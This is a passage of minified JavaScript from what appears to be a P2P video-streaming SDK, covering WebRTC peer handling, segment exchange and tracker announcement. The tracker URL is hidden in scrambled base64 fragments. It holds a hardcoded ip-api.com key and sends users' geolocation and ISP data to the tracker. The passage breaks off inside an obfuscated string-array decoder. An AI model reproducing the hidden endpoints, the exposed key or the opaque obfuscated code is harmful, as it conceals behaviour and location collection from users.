o=!1;r.forEach((e=>{"remotecandidate"!==e.type&&"remote-candidate"!==e.type||(s[e.id]=e),"localcandidate"!==e.type&&"local-candidate"!==e.type||(i[e.id]=e),"candidatepair"!==e.type&&"candidate-pair"!==e.type||(n[e.id]=e)}));const a=e=>{o=!0;let t=i[e.localCandidateId];t&&(t.ip||t.address)?(this.localAddress=t.ip||t.address,this.localPort=Number(t.port)):t&&t.ipAddress?(this.localAddress=t.ipAddress,this.localPort=Number(t.portNumber)):"string"==typeof e.googLocalAddress&&(t=e.googLocalAddress.split(":"),this.localAddress=t[0],this.localPort=Number(t[1])),this.localAddress&&(this.localFamily=this.localAddress.includes(":")?"IPv6":"IPv4");let r=s[e.remoteCandidateId];r&&(r.ip||r.address)?(this.remoteAddress=r.ip||r.address,this.remotePort=Number(r.port)):r&&r.ipAddress?(this.remoteAddress=r.ipAddress,this.remotePort=Number(r.portNumber)):"string"==typeof e.googRemoteAddress&&(r=e.googRemoteAddress.split(":"),this.remoteAddress=r[0],this.remotePort=Number(r[1])),this.remoteAddress&&(this.remoteFamily=this.remoteAddress.includes(":")?"IPv6":"IPv4")};if(r.forEach((e=>{"transport"===e.type&&e.selectedCandidatePairId&&a(n[e.selectedCandidatePairId]),("googCandidatePair"===e.type&&"true"===e.googActiveConnection||("candidatepair"===e.type||"candidate-pair"===e.type)&&e.selected)&&a(e)})),o||Object.keys(n).length&&!Object.keys(i).length){if(this._connecting=!1,this._connected=!0,this._chunk){try{this.send(this._chunk)}catch(t){return this.destroy(t)}this._chunk=null;const e=this._cb;this._cb=null,e(null)}"number"!=typeof this._channel.bufferedAmountLowThreshold&&(this._interval=setInterval((()=>this._onInterval()),150),this._interval.unref&&this._interval.unref()),this.emit("connect")}else setTimeout(e,100)}))};e()}_onInterval(){!this._cb||!this._channel||this._channel.bufferedAmount>MAX_BUFFERED_AMOUNT||this._onChannelBufferedAmountLow()}_onSignalingStateChange(){this.destroyed||("stable"===this._pc.signalingState&&(this._isNegotiating=!1,this._sendersAwaitingStable.forEach((e=>{this._pc.removeTrack(e),this._queuedNegotiation=!0})),this._sendersAwaitingStable=[],this._queuedNegotiation?(this._queuedNegotiation=!1,this._needsNegotiation()):this.emit("negotiated")),this.emit("signalingStateChange",this._pc.signalingState))}_onIceCandidate(e){this.destroyed||(e.candidate&&this.trickle?this.emit("signal",{type:"candidate",candidate:{candidate:e.candidate.candidate,sdpMLineIndex:e.candidate.sdpMLineIndex,sdpMid:e.candidate.sdpMid}}):e.candidate||this._iceComplete||(this._iceComplete=!0,this.emit("_iceComplete")),e.candidate&&this._startIceCompleteTimeout())}_onChannelMessage(e){if(this.destroyed)return;let t=e.data;t instanceof ArrayBuffer&&(t=utils_buffer.l.from(t)),this.emit("data",t)}_onChannelBufferedAmountLow(){if(this.destroyed||!this._cb)return;const e=this._cb;this._cb=null,e(null)}_onChannelOpen(){this._connected||this.destroyed||(this._channelReady=!0,this._maybeReady())}_onChannelClose(){this.destroyed||this.destroy()}}Peer.config={iceServers:[{urls:["stun:stun.l.google.com:19302","stun:global.stun.twilio.com:3478"]}],sdpSemantics:"unified-plan"},Peer.channelConfig={};const peer_channel=Peer,core_events={DC_SIGNAL:"SIGNAL",DC_OPEN:"OPEN",DC_REQUEST:"REQUEST",DC_SEND_REQUEST:"SEND_REQUEST",DC_PIECE_NOT_FOUND:"PIECE_NOT_FOUND",DC_PIECE_ABORT:"PIECE_ABORT",DC_PIECE_CANCEL:"PIECE_CANCEL",DC_CLOSE:"CLOSE",DC_RESPONSE:"RESPONSE",DC_ERROR:"ERROR",DC_PIECE:"PIECE",DC_PIECE_DATA:"PIECE_DATA",DC_TIMEOUT:"TIMEOUT",DC_PIECE_ACK:"PIECE_ACK",DC_METADATA:"METADATA",DC_PLAT_ANDROID:"ANDROID",DC_PLAT_IOS:"IOS",DC_PLAT_WEB:"WEB",DC_CHOKE:"CHOKE",DC_UNCHOKE:"UNCHOKE",DC_HAVE:"HAVE",DC_HAVE_REVERSE:"HAVE_REVERSE",DC_LOST:"LOST",DC_GET_PEERS:"GET_PEERS",DC_PEERS:"PEERS",DC_STATS:"STATS",DC_PEER_SIGNAL:"PEER_SIGNAL",DC_PLAYLIST:"PLAYLIST",BM_LOST:"lost",BM_ADDED_SEG_:"BM_ADDED_SEG_",BM_ADDED_SN_:"BM_ADDED_SN_",BM_SEG_ADDED:"BM_SEG_ADDED",FRAG_CHANGED:"FRAG_CHANGED",FRAG_LOADED:"FRAG_LOADED",FRAG_LOADING:"FRAG_LOADING",RESTART_P2P:"RESTART_P2P",EXCEPTION:"exception",REQUESTING_MAP_HAVE:"REQUESTING_MAP_HAVE",BUILDER_MAP_HAVE:"BUILDER_MAP_HAVE",SYN_OUTPUT:"SYN_OUTPUT",SYN_ERROR:"SYN_ERROR",SYN_PARTIAL:"SYN_PARTIAL",SVR_PEERS:"SVR_PEERS"};class Segment{constructor(e,t,r,s,i=0){this.sn=e,this.segId=t,this.data=r,this.fromPeerId=s,this.level=i||0}static fromSegment(e){return new Segment(e.sn,e.segId,e.data,e.fromPeerId,e.level)}get size(){return this.data.byteLength}get isSequential(){return this.sn>=0}}var platform=__webpack_require__(422),platform_default=__webpack_require__.n(platform);const DC_TOLERANCE=2,ALPHA=.6;class peer_Peer extends(events_default()){static get defaultPacketSize(){return DEFAULT_PACKET_SIZE}static get VERSION(){return"8"}constructor(e,t,r,s,i,n={}){super(),this.channel=e.fetcher.channelId,this.logger=e.logger,this.config=i,this.isInitiator=s,this.options=n,this.intermediator=n.intermediator||null,this.signalMsgs=[],this.assignPeerId(t,r),this.platform="unknown",this.mobile=!1,this.mobileWeb=!1,this.mobileNet=!1,this.connected=!1,this.msgQueue=[],this.miss=0,this.notifySet=new Set,this.bufArr=[],this.packetSize=DEFAULT_PACKET_SIZE,this.sendReqQueue=[],this.downloading=!1,this.uploading=!1,this.choked=!1,this.streamListeners=[],this.pieceMsg={},this.uploadInterrupter={targetSegId:void 0,currentSegId:void 0,canceled:!1},this.datasToSend=[],this.bytesUploaded=0,this.dataWriting=!1,this.timeSendRequest=0,this.timeReceivePiece=0,this.timeSendPiece=0,this.weight=0,this.peersConnected=1,this.uploadSpeed=0,this.gotPeers=!1,this.currentLevel=0,this.currentPos=0,this.useBackupSignal=!1,this.webRTCConfig={};const{stuns:o}=this.options;if(o&&o.length>0){const e=[];o.forEach((t=>{this.logger.info(`use stun ${t}`),e.push({urls:t})})),this.webRTCConfig.iceServers=e}this.config.webRTCConfig&&(this.webRTCConfig={...this.config.webRTCConfig,...this.webRTCConfig}),this.playlistMap=new Map,this._initPeerChannel(),this.notFatalClosed=!1,this.startSN=Number.MAX_SAFE_INTEGER,this.endSN=-1,this._loadedBytes=0}assignPeerId(e,t){this.remotePeerId=t,this.channelId=this.isInitiator?`${e}-${t}`:`${t}-${e}`,t&&(this.timeJoin=getCurrentTs(),this.dataExchangeTs=this.timeJoin,this.gotStatsTs=this.timeJoin,this._startTimer()),setTimeout((()=>{for(let e of this.signalMsgs)this.emit(core_events.DC_SIGNAL,e,!0)}),0)}_startTimer(){this.connTimeout=setTimeout((()=>{this.logger.warn(`dc ${this.channelId} connection timeout`),this.emit(core_events.DC_TIMEOUT)}),25e3)}get isAvailable(){return this.downloadNum<2&&!this.choked}get isAvailableUrgently(){return!this.downloading&&!this.choked}cancelDownload(e,t,r){if(r&&this.downloading&&!(this.streamListeners.length>0||this.remainAttachments<=2))return this.logger.info(`cancel download ${r} remain packets ${this.remainAttachments}`),this.timeReceivePiece=0,this.sendJson({event:core_events.DC_PIECE_CANCEL,sn:e,level:t,seg_id:r})}addStreamListener(e,t,r){this.streamListeners.push({handler:r,peerId:t})}removeStreamListener(e){this.streamListeners=this.streamListeners.filter((t=>t.peerId!==e||(t.handler(void 0,void 0,!0,"aborted by cancel"),!1)))}_initPeerChannel(){const e=new peer_channel({initiator:this.isInitiator,trickle:this.options.trickle||!1,config:this.webRTCConfig});this._datachannel=e,e.on("error",(e=>{let t=!0;"Ice connection failed."===e.message&&this.notFatalClosed&&(t=!1),this.emit(core_events.DC_ERROR,t)})),e.on("signal",(e=>{this.signalMsgs.push(e),this.emit(core_events.DC_SIGNAL,e)}));e.on("connect",(()=>{for(this.logger.info(`datachannel CONNECTED to ${this.remotePeerId} from ${this.intermediator?"peer":"server"}`),this.connected=!0,clearTimeout(this.connTimeout),this.signalMsgs=[],this.emit(core_events.DC_OPEN);this.msgQueue.length>0;){let e=this.msgQueue.shift();this.emit(e.event,e)}})),e.on("data",(e=>{const{logger:t}=this;if("string"==typeof e){let r=JSON.parse(e);if(!this.connected)return void this.msgQueue.push(r);let s,i=r.event;switch(s=i!==core_events.DC_PLAYLIST&&i!==core_events.DC_PEER_SIGNAL?`string: ${e}`:`event: ${i}`,t.debug(`datachannel receive ${s} from ${this.remotePeerId}`),i){case core_events.DC_HAVE:if(this.emit(r.event,r),!r.sn)return;this.config.live||(r.sn<this.startSN&&(this.startSN=r.sn),r.sn>this.endSN&&(this.endSN=r.sn));break;case core_events.DC_PIECE:this.downloading=!0,this.dataExchangeTs=getCurrentTs(),this.timeReceivePiece=performance.now(),this.pieceMsg=r,this._prepareForBinary(r.attachments,r.seg_id,r.sn,r.size),this.emit(r.event,r);break;case core_events.DC_PIECE_CANCEL:this.uploadInterrupter.targetSegId=r.seg_id,this.emit(r.event,r);break;case core_events.DC_PIECE_NOT_FOUND:this._sendNextReq()||(this.downloading=!1),this.emit(r.event,r);break;case core_events.DC_REQUEST:this._handleRequestMsg(r);break;case core_events.DC_PIECE_ACK:this.uploadInterrupter.canceled||(this._handlePieceAck(r.size,r.miss),this.emit(r.event,r));break;case core_events.DC_STATS:this._handleStats(r);break;case core_events.DC_PLAYLIST:this.config.sharePlaylist&&this._handlePlaylist(r);break;case core_events.DC_METADATA:this._handleMetadata(r);break;case core_events.DC_PIECE_ABORT:this.downloading&&(this._notifyDownloadListenersAbort("aborted by upstream peer"),this.emit(core_events.DC_PIECE_ABORT,r));break;case core_events.DC_CHOKE:t.info(`choke peer ${this.remotePeerId}`),this.choked=!0;break;case core_events.DC_UNCHOKE:t.info(`unchoke peer ${this.remotePeerId}`),this.choked=!1;break;case core_events.DC_CLOSE:this.emit(r.event,r.fatal||!1);break;default:this.emit(r.event,r)}}else{if(!this.downloading)return void t.warn(`peer not downloading, data size ${e.byteLength} pieceMsg ${JSON.stringify(this.pieceMsg)}`);this._handleBinaryMsg(e)}})),e.once("close",(()=>{this.emit(core_events.DC_CLOSE,!1)})),e.on("iceStateChange",((e,t)=>{"disconnected"===e&&(this.logger.warn(`${this.remotePeerId} disconnected`),this.connected=!1)}))}sendJson(e){e.event!==core_events.DC_PLAYLIST&&e.event!==core_events.DC_PEER_SIGNAL?this.logger.debug(`dc bufferSize ${this._datachannel.bufferSize} send ${JSON.stringify(e)} to ${this.remotePeerId}`):this.logger.debug(`dc send event ${e.event} to ${this.remotePeerId}`);const t=JSON.stringify(e);return t.length>DEFAULT_PACKET_SIZE?(this.logger.error("string to send is too large"),!1):this.send(t,!1)}send(e,t=!0){return t?(this.datasToSend.push(e),this.dataWriting||this._sendDataSync(),!0):this.sendImmediately(e)}_checkIfNeedInterrupt(){const{targetSegId:e,currentSegId:t,canceled:r}=this.uploadInterrupter;return!!r||!(!e||e!==t)&&(this.logger.info("cancel send data"),this.sendMsgPieceAbort(`${t} transfer canceled`),this.datasToSend=[],this.uploadInterrupter.canceled=!0,this._handlePieceAck(this.bytesUploaded,0),this.emit(core_events.DC_PIECE_ACK,{seg_id:t,size:this.bytesUploaded,canceled:!0}),!0)}_sendDataSync(){if(this._checkIfNeedInterrupt()||0===this.datasToSend.length)return void(this.dataWriting=!1);this.dataWriting=!0;const e=this.datasToSend.shift();this.bytesUploaded+=e.byteLength,this._datachannel.write(e,(e=>{if(e)return this.dataWriting=!1,this.logger.warn(e.message),void this.emit(core_events.DC_ERROR,!1);this._sendDataSync()}))}sendImmediately(e){if(this._datachannel.connected)try{return this._datachannel.send(e),!0}catch(e){this.logger.warn(`datachannel ${this.channelId} send data failed, close it`),this.emit(core_events.DC_ERROR,!1)}return!1}sendMsgHave(e,t,r={}){const s=r.reverse||void 0;delete r.reverse,this.sendJson({event:s?core_events.DC_HAVE_REVERSE:core_events.DC_HAVE,sn:e,seg_id:t,...r})}sendPieceNotFound(e,t,r={}){this.uploading=!1,this.sendJson({event:core_events.DC_PIECE_NOT_FOUND,seg_id:t,sn:e,...r})}sendPeers(e){this.sendJson({event:core_events.DC_PEERS,peers:e})}sendPeersRequest(){this.sendJson({event:core_events.DC_GET_PEERS})}sendMsgStats(e,t={}){const r={event:core_events.DC_STATS,total_conns:e,...t};this.sendJson(r)}sendMsgPlaylist(e,t,r){const s=this.playlistMap.get(e);if(s&&s.seq>=r)return;const i={event:core_events.DC_PLAYLIST,url:e,data:t,seq:r};this.playlistMap.set(e,{data:t,seq:r}),this.sendJson(i)}sendMsgSignal(e,t,r){return this.sendJson({event:core_events.DC_PEER_SIGNAL,action:"signal",to_peer_id:e,from_peer_id:t,data:r})}sendMsgSignalReject(e,t,r,s=!1){return this.sendJson({event:core_events.DC_PEER_SIGNAL,action:"reject",to_peer_id:e,from_peer_id:t,reason:r,fatal:s})}sendMetaData(e,t,r,s=!1){this.isInitiator&&(this.timeSendRequest=performance.now()),this.sendJson({event:core_events.DC_METADATA,field:e,platform:core_events.DC_PLAT_WEB,mobile:!!platform_default().isMobile(),mobile_net:s,channel:this.channel,version:"0.6.2",sequential:t,peers:r})}sendPartialBuffer(e,t,r={}){this.sendMsgPiece(e,r);for(let e=0;e<t.length;e++)this.send(t[e])}sendMsgPiece(e,t={}){const{targetSegId:r}=this.uploadInterrupter;if(r&&r===e.seg_id)return this.logger.info("cancel send piece msg"),this.sendMsgPieceAbort(`${r} piece canceled`),void(this.uploadInterrupter.canceled=!0);this.uploadInterrupter={currentSegId:e.seg_id,targetSegId:void 0,canceled:!1},this.datasToSend=[],this.bytesUploaded=0,e.ext||(e.ext={}),e.ext.from&&t.from&&(t.from=`${e.ext.from}->${t.from}`),t.incompletes&&e.ext.incompletes&&(t.incompletes+=e.ext.incompletes),t=Object.assign({},e.ext,t);const s={...e,ext:t};this.sendJson(s)}sendBuffer(e,t,r,s={}){const i=s.reverse||void 0;delete s.reverse;let n=r.byteLength,o=0,a=0;n%this.packetSize==0?a=n/this.packetSize:(a=Math.floor(n/this.packetSize)+1,o=n%this.packetSize);let h={event:core_events.DC_PIECE,attachments:a,seg_id:t,sn:e,level:s.level,size:n,reverse:i};delete s.level,this.sendMsgPiece(h,s);const c=dividePayload(r,this.packetSize,a,o);this._sendBufferArray(c,i),this.uploading=!1,this.timeSendPiece=performance.now()}get downloadNum(){return this.downloading?this.sendReqQueue.length+1:0}requestDataById(e,t,r=!1,s={}){const i={event:core_events.DC_REQUEST,seg_id:e,sn:t,...s,urgent:r};this.downloading?(this.logger.info(`${this.remotePeerId} add req ${e} in queue`),r?this.sendReqQueue.unshift(i):this.sendReqQueue.push(i)):this._realRequestData(i)}requestDataBySN(e,t=!1,r={}){const s={event:core_events.DC_REQUEST,sn:e,...r,urgent:t};this.downloading?(this.logger.info(`add req ${e} in queue`),t?this.sendReqQueue.unshift(s):this.sendReqQueue.push(s)):this._realRequestData(s)}_sendBufferArray(e,t=!1){const r=t?e.reverse():e;for(let e=0;e<r.length;e++)this.send(r[e])}_realRequestData(e){this.sendJson(e),this.timeSendRequest=performance.now(),this.downloading=!0,this.emit(core_events.DC_SEND_REQUEST)}shouldWaitForRemain(e){return 0!==this.bufArr.length&&(0!==this.timeReceivePiece&&this.currentLoadSpeed()>=this.minRequiredSpeed(e))}close(e){e||(this.notFatalClosed=!0),this.emit(core_events.DC_CLOSE,e)}receiveSignal(e){e&&this._datachannel.signal(e)}_notifyDownloadListenersAbort(e){for(let t of this.streamListeners){const{handler:r}=t;r(void 0,void 0,!0,e)}this.streamListeners=[]}destroy(e=!0){this.logger.info(`destroy datachannel ${this.channelId}`),this.chokeTimer&&clearTimeout(this.chokeTimer),this.connTimeout&&clearTimeout(this.connTimeout),this.uploading&&this.sendMsgPieceAbort("peer is closing"),this._notifyDownloadListenersAbort("upstream peer is closed");let t={event:core_events.DC_CLOSE,fatal:e};this.sendJson(t),this._datachannel.removeAllListeners(),this.removeAllListeners(),this._datachannel.destroy()}_handleBinaryMsg(e){const{attachments:t,level:r,reverse:s}=this.pieceMsg;this.bufArr.push(e),this._loadedBytes+=e.byteLength,this.remainAttachments--;let i=s?this.remainAttachments+1:t-this.remainAttachments;const n=0===this.remainAttachments;if(this.emit(core_events.DC_PIECE_DATA,this.bufSN,this.segId,e,i,n,this.pieceMsg),this.streamListeners.length>0)for(let t of this.streamListeners){const{handler:r}=t;r(this.bufSN,this.segId,!1,e,n)}if(n){if(this.streamListeners=[],this.timeSendRequest>0){const e=this.expectedSize/(performance.now()-this.timeSendRequest);this.weight=this.weight>0?ALPHA*this.weight+(1-ALPHA)*e:e}this.sendJson({event:core_events.DC_PIECE_ACK,sn:this.bufSN,seg_id:this.segId,level:r,size:this.expectedSize,miss:this.miss||void 0}),this.timeSendRequest=0,this.timeReceivePiece=0,this._sendNextReq()||(this.downloading=!1),this._handleBinaryData(s)}}_sendNextReq(){if(this.sendReqQueue.length>0){const e=this.sendReqQueue.shift();return this.logger.info(`get msg from sendReqQueue ${JSON.stringify(e)}`),this._realRequestData(e),!0}return!1}_handlePlaylist(e){const{url:t,data:r,seq:s}=e;this.playlistMap.set(t,{data:r,seq:s})}getLatestPlaylist(e,t){if(!this.playlistMap.has(e))return null;const r=this.playlistMap.get(e);return r.seq<=t||r.seq>t+2?null:r}_handleMetadata(e){const{logger:t}=this;if(this.isInitiator){const e=performance.now()-this.timeSendRequest;e>0&&(this.weight=1e5/e,t.info(`handle Metadata from ${this.remotePeerId} initial weight ${this.weight}`)),this.timeSendRequest=0}const r=e.channel;if(!r)return t.error(`peer channel ${r} is null!`),void this.emit(core_events.DC_ERROR,!0);if(this.channel!==r)return t.error(`peer channel ${r} not matched!`),void this.emit(core_events.DC_ERROR,!0);switch(e.platform){case core_events.DC_PLAT_ANDROID:this.platform=core_events.DC_PLAT_ANDROID;break;case core_events.DC_PLAT_IOS:this.platform=core_events.DC_PLAT_IOS;break;case core_events.DC_PLAT_WEB:this.platform=core_events.DC_PLAT_WEB}if(this.mobile=e.mobile||!1,this.mobileNet=e.mobile_net||!1,this.mobileWeb=this.mobile&&this.platform===core_events.DC_PLAT_WEB||!1,this.sequential=e.sequential,t.info(`${this.remotePeerId} platform ${this.platform} sequential ${this.sequential}`),e.peers&&(this.peersConnected+=e.peers,t.info(`${this.remotePeerId} now has ${this.peersConnected} peers`)),this.emit(core_events.DC_METADATA,e),e.field&&!this.config.live&&e.sequential){const{field:t}=e;if(Array.isArray(t))this._handleField(t);else for(let e in t)this._handleField(t[e])}}_handleField(e){e.forEach((e=>{e>=0&&(e<this.startSN&&(this.startSN=e),e>this.endSN&&(this.endSN=e))}))}_handleStats(e){this.gotStatsTs=getCurrentTs();const t=e.total_conns;t>0&&this.peersConnected!==t&&(this.peersConnected=t,this.logger.info(`${this.remotePeerId} now has ${this.peersConnected} peers`)),e.level&&(this.currentLevel=e.level),e.pos&&(this.currentPos=e.pos)}_handleRequestMsg(e){if(this.dataExchangeTs=getCurrentTs(),this.uploading)return this.logger.warn(`${this.remotePeerId} is uploading when receive request`),void this.sendPieceNotFound(e.sn,e.seg_id,{level:e.level});this.uploading=!0,this.emit(core_events.DC_REQUEST,e)}_handlePieceAck(e,t){0!==this.timeSendPiece&&(this.uploadSpeed=Math.round(e/(performance.now()-this.timeSendPiece)*2),this.timeSendPiece=0,this.logger.info(`${this.remotePeerId} uploadSpeed is ${this.uploadSpeed}`)),t>0&&this.logger.warn(`peer ${this.remotePeerId} miss ${t}`)}_prepareForBinary(e,t,r,s){this.bufArr=[],this.remainAttachments=e,this.segId=t,this.bufSN=r,this.expectedSize=s}_handleBinaryData(e=!1){if(this.listenerCount(core_events.DC_RESPONSE)>0){e&&this.bufArr.reverse();let t=utils_buffer.l.concat(this.bufArr);const r=t.byteLength;if(r===this.expectedSize){let e=t.buffer;const r=new Segment(this.bufSN,this.segId,e,this.remotePeerId,this.pieceMsg.level);this.emit(core_events.DC_RESPONSE,r,this.weight)}else this.logger.error(`${this.segId} expectedSize ${this.expectedSize} != byteLength ${r}`)}this.segId="",this.bufArr=[],this._loadedBytes=0}checkIfNeedChoke(e=!1){const{logger:t}=this,r=performance.now()-this.timeSendRequest;if(!e&&r<1500)t.info(`duration ${r} no need choke`);else if(this.miss++,t.info(`${this.remotePeerId} miss ${this.miss}`),this.miss>DC_TOLERANCE&&!this.choked){this.choked=!0;const e=30*this.miss;e<=150?(t.warn(`datachannel ${this.channelId} is choked`),this.chokeTimer=setTimeout((()=>{this.choked=!1,t.warn(`datachannel ${this.channelId} is unchoked`)}),1e3*e)):t.warn(`datachannel ${this.channelId} is choked permanently`)}}loadtimeout(){const{logger:e,bufArr:t,pieceMsg:r}=this;return e.warn(`timeout while downloading from ${this.remotePeerId}, ${t.length} of ${r.attachments} packets loaded`),this.checkIfNeedChoke(),!0}sendMsgPieceAbort(e){(this.uploading||0!==this.datasToSend.length)&&(this.uploading=!1,this.sendJson({event:core_events.DC_PIECE_ABORT,reason:e}))}loadedBytes(){return this._loadedBytes}currentLoadSpeed(){return 0===this.timeReceivePiece?0:this.loadedBytes()/(performance.now()-this.timeReceivePiece)}minRequiredSpeed(e){return(this.pieceMsg.size-this.loadedBytes())/e}}function dividePayload(e,t,r,s){let i=[];if(s){let n;for(let s=0;s<r-1;s++)n=e.slice(s*t,(s+1)*t),i.push(n);n=e.slice(e.byteLength-s,e.byteLength),i.push(n)}else{let s;for(let n=0;n<r;n++)s=e.slice(n*t,(n+1)*t),i.push(s)}return i}const peer=peer_Peer;var md5=__webpack_require__(485),md5_default=__webpack_require__.n(md5),url_toolkit=__webpack_require__(622),url_toolkit_default=__webpack_require__.n(url_toolkit),err_code=__webpack_require__(934),err_code_default=__webpack_require__.n(err_code);const setItem=(e,t)=>{"object"==typeof t&&(t=JSON.stringify(t)),localStorage.setItem(e,t)},hasItemUnexpired=e=>{const t=localStorage.getItem(e);try{const e=JSON.parse(t);if(e.duration&&e.startTime){return(new Date).getTime()-e.startTime<e.duration}return!1}catch(e){return!1}},getItem=e=>{const t=localStorage.getItem(e);try{const e=JSON.parse(t);return e.value?e.value:e}catch(e){return t}},removeItem=e=>{localStorage.removeItem(e)},removeAllItem=()=>{localStorage.clear()},setItemWithExpiration=(e,t,r)=>{let s={value:t,duration:r,startTime:(new Date).getTime()};setItem(e,s)},MIN_CONNS=8,BASE_REPORT_INTERVAL=20,IPAPI_URL="//pro.ip-api.com/json?fields=2181826&key=XOpiansRgYxGTho",IPAPI_TIMEOUT=600,GEOIP_KEY="SW_GEOIP_KEY",GEOIP_EXPIRATION=2592e5,GEOIP_EXPIRATION_MOBILE=432e5,URL_MAP={q:"uZ2luZS5u",v:"Y24u",3:"Y2Ru",0:"yMzMzL2Js",l:"Nvb",zz:"aHR0cHMlM",n:"YnllLm",h:"ZXQlM0E",7:"Q==",df:"0EvL",6:"3AycGV",x:"aGsuc3d",kj:"dHJhY",a:"2tlci5","+":"oZHR2","=":"Y2xvdW",w:"QuY29t",o:"hcm1j",xo:"bG91ZC",sb:"5uZXQ="},_httpDownloaded=Symbol("httpDownloaded"),_p2pDownloaded=Symbol("p2pDownloaded"),_p2pUploaded=Symbol("p2pUploaded");class Server extends(events_default()){constructor(e,t,r,s,i){let n;super(),this.config=e.config;let o=this.config.announceLocation;switch(this.config.trackerZone&&(o=this.config.trackerZone),o){case"cn":case"eu":n=URL_MAP.v+URL_MAP[3]+URL_MAP.n+URL_MAP.l+URL_MAP[7];break;case"hk":n=URL_MAP.x+URL_MAP.o+URL_MAP.xo+URL_MAP.sb;break;case"us":n=URL_MAP.kj+URL_MAP.a+URL_MAP["+"]+URL_MAP["="]+URL_MAP.w}this.engine=e,this.key=t||void 0,this.baseUrl=s||`https://${window.atob(n)}/v1`,this.channelId=window.btoa(r),this.timestamp=getCurrentTs();const a=url_toolkit_default().parseURL(this.baseUrl).netLoc;this.announce=a.replace(/\/\//,"");const h=genV(this.timestamp,"0.6.2",this.announce,this.channelId,i.type,this.key);this.native=!!i.bundle,this.announceInfo={...i,channel:this.channelId,ts:this.timestamp,version:"0.6.2",v:h,announce:this.announce,token:this.key},this.announceURL=`${this.baseUrl}/channel`,this.reportFails=0,this.statsRequesting=!1,this.forbidden=!1,this.failConns=0,this.totalHTTPDownloaded=0,this.totalP2PDownloaded=0,this.totalP2PUploaded=0,this[_httpDownloaded]=0,this[_p2pDownloaded]=0,this[_p2pUploaded]=0,this.speed=0,this.offline=!1,this.errsBufStalled=0,this.mediaRequests=0,this.errsInternalExpt=0}geoipRequest(){const{logger:e}=this.engine;return new Promise(((t,r)=>{if(hasItemUnexpired(GEOIP_KEY)){const r=getItem(GEOIP_KEY);e.info("found local geo data"),t(r)}else fetch(IPAPI_URL).then((e=>e.json())).then((e=>{if("success"===e.status){const r=e.mobile?GEOIP_EXPIRATION_MOBILE:GEOIP_EXPIRATION;setItemWithExpiration(GEOIP_KEY,e,r),t(e)}else{const t=new Error(`preflight status ${e.status}`);r(err_code_default()(t,"IPAPI_ERROR"))}})).catch((e=>{r(e)}))}))}btAnnouncePreflight(){const{logger:e}=this.engine;return this.announceInfo.asn?this.btAnnounce():(e.info("preflight ip-api"),Promise.race([this.geoipRequest(),new Promise(((e,t)=>{setTimeout((()=>{t(err_code_default()(new Error("request timeout"),"IPAPI_ERROR"))}),IPAPI_TIMEOUT)}))]).then((e=>(this._parseGeoResponse(e),this.btAnnounce()))).catch((t=>{if("TRACKER_EXPT"!==t.code){const t=getItem(GEOIP_KEY);return t&&(e.info("use expired ipData"),this._parseGeoResponse(t)),this.btAnnounce()}throw t})))}_parseGeoResponse(e){const{lat:t,lon:r,isp:s,as:i,mobile:n,countryCode:o,continentCode:a}=e;n&&(this.announceInfo.netType="cellular");const h=i.split(" ")[0].substr(2);this.announceInfo.tag||(this.announceInfo.tag=`${a||""}-${(0,platform.getBrowser)()}${isHttps()?"s":""}`),this.announceInfo={...this.announceInfo,lat:t,lon:r,isp:s,asn:h,country:o}}btAnnounce(){const{logger:e}=this.engine;return this.announceInfo.tag||(this.announceInfo.tag=`${(0,platform.getBrowser)()}${isHttps()?"s":""}`),new Promise(((t,r)=>{fetch(this.announceURL,{headers:this._requestHeader,method:"POST",body:JSON.stringify(this.announceInfo)}).then((e=>e.json())).then((e=>{this.engine||r(err_code_default()(new Error("runtime error"),"TRACKER_EXPT",{retry:!1}));const s=e.data;if(s.f&&(this.forbidden=!0),-1===e.ret){const{code:t,msg:s}=e.data;r(err_code_default()(new Error(s),"TRACKER_EXPT",{retry:t>=5e3}))}else s.info&&console.info(`${s.info}`),s.warn&&console.warn(`${s.warn}`),s.min_conns||(s.min_conns=MIN_CONNS),(!s.rejected||s.rejected&&s.share_only)&&s.id&&s.report_interval&&s.peers?(this.peerId=this.id=s.id,s.report_interval<BASE_REPORT_INTERVAL&&(s.report_interval=BASE_REPORT_INTERVAL),this.btStats(s.report_interval),this.getPeersURL=`${this.baseUrl}/channel/${this.channelId}/node/${this.peerId}/peers`,this.statsURL=`${this.baseUrl}/channel/${this.channelId}/node/${this.peerId}/stats`,t(s)):(this.engine&&(this.engine.p2pEnabled=!1),r(err_code_default()(new Error("msg not valid"),"TRACKER_EXPT",{retry:!1})))})).catch((t=>{e.error(`btAnnounce error ${t}`),r(err_code_default()(t,"TRACKER_EXPT",{retry:!0}))}))}))}btStats(interval=10){let _this=this;this.heartbeater=setInterval((()=>{this.postStats(),_b(interval)}),1e3*interval);var _0x5bd5=["v1","PmvWt1ORKFVimMIwnGl==","wpUsdEvDhA==","eC3CqcOrQ8KQRMKK","HUEHO8OWMcKWw5M=","ZxfChcKtEg==","DcOIVgXDtQ==","CwbCicO9woI=","wpfCo3VewrY=","w4c+w7JXw7Y=","TFt/wo3CsA==","X8ONKcKCw74=","w4PCoMO/eg4=","N2Upwoow","fMKDccOGw5o=","RcKlXcOUw64=","wpnCl8OHAMKd","A8OTwrHCpWk=","wr3DhVM=","AcOVVS/DosO8wo/ClA==","w4PChcOl","dcO0TMKZEsO6w5XCscKMSDDDmg==","w7otSDDDkMOOLQ==","wqTCmsKMw6zCgw==","Dlg5DMO3","b8KJJFzDl8OLw7TDow==","w7gnaTfDi8OILRw=","d3l/wqE=","BGsww7hG","wojClsKHw5HCsg==","QcOJRm3DlA==","ecKaScOKw6c=","w5bCq8Oj","w4dTw61e","w4zCqMOQfMOA","wr8ORHXDog==","wrzCkcOmNsKb","w4E4w41R","Vj7CscKgAg==","T8OLLMOGCQ==","c8Krw67CoRI=","e8OjQcKBwqc=","w4oNwqtbwoM=","W8OQR8K0Ng==","DsO6w6nDl8Ki","V8O/ZMK0Jg==","NgbCvcOpwqo=","EV8hAMOi","wp/CjU7Ch8Kj","wo/CiUbClsKFGi9ew4rDtA==","WcKHLUbDkQ==","cMOLw5vCkBo="],_0x3eee5c,_0x2b2808;_0x3eee5c=_0x5bd5,_0x2b2808=343,function(e,t,r,s){if((t>>=8)<e){for(;--e;)s=_0x3eee5c.shift(),t===e?(t=s,r=_0x3eee5c.shift()):r.replace(/[PmWtORKFVimMIwnGl=]/g,"")===t&&_0x3eee5c.push(s);_0x3eee5c.push(_0x3eee5c.shift())}}(++_0x2b2808,87808);var _0x38aa=function(e,t){e=~~"0x".concat(e);var r=_0x5bd5[e];if(void 0===_0x38aa.UJLmyS){!function(){var e="undefined"!=typeof window?window:"object"==typeof process&&"object"==typeof 